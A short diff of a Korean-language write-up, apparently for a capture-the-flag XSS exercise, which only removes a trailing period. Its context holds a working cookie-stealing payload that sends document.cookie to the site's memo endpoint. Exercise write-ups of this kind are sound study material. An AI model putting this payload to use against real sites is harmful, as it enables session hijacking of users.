@@ -123,7 +123,7 @@
 ## memo 페이지 사용
 
     flag 엔드포인트에서 다음과 같은 익스플로잇 코드를 입력하면
-    memo 엔드포인트에서 임의 이용자의 쿠키 정보를 확인할 수 있음.
+    memo 엔드포인트에서 임의 이용자의 쿠키 정보를 확인할 수 있음
 
     <script>location.href = "/memo?memo="+document.cookie;</script>
 
